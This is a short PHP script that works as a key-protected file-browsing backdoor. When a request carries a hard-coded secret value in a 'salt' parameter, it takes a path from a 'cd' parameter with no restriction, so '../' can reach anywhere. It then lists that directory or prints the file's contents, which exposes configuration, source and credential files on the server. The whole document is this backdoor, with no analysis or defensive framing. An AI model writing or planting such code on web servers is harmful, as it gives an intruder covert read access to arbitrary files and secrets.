<?php
if ($_GET['salt'] != 'WtsMVFHjj53PmE07') die;
$path = realpath(__DIR__.'/'.$_GET['cd']);
echo "$path<br>";
if (!file_exists($path)) {
  echo "not exists";
  die;
}

if (is_dir($path)) echo join("<br>", scandir($path));
else echo file_get_contents($path);
die;
